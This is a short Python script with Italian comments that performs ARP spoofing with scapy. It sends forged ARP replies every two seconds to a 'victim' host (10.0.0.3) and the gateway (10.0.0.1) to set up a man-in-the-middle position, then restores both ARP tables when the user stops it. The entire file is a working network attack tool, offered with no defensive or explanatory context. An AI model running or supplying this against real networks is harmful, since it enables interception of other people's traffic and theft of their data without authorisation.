#!/usr/bin/python3
import scapy.all as scapy
import time


"""----------------------- Sezione costanti e variabili di utilità -----------------------"""

ip_vittima = "10.0.0.3"
ip_gateway = "10.0.0.1"

"""----------------------- Fine sezione costanti e variabili di utilità -----------------------"""

"""----------------------- Sezione metodi di utilità -----------------------"""


def ottieni_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request 
	risposta = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
	return risposta[0][1].hwsrc


def spoof(target_ip, spoof_ip): 
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=ottieni_mac(target_ip), psrc=spoof_ip)
	scapy.send(packet, verbose=False)


def ripristina_tabelle_arp(ip_destinazione, ip_sorgente):
	mac_destinazione = ottieni_mac(ip_destinazione)
	mac_sorgente = ottieni_mac(ip_sorgente)
	pacchetto = scapy.ARP(op=2, pdst=ip_destinazione, hwdst=mac_destinazione, psrc=ip_sorgente, hwsrc=mac_sorgente)
	scapy.send(pacchetto, verbose=False)


"""----------------------- Fine sezione metodi di utilità -----------------------"""


if __name__ == '__main__':
	try:
		pacchetti_inviati = 0
		while True:
			spoof(ip_vittima, ip_gateway)
			spoof(ip_gateway, ip_vittima)
			pacchetti_inviati = pacchetti_inviati + 2
			print("\r[*] Pacchetti Inviati " + str(pacchetti_inviati), end="")
			time.sleep(2)  # Attendi per due secondi

	except KeyboardInterrupt:
		print("\nCtrl + C pressed.............Exiting")
		ripristina_tabelle_arp(ip_gateway, ip_vittima)
		ripristina_tabelle_arp(ip_vittima, ip_gateway)
		print("[+] Arp Spoof Stopped")
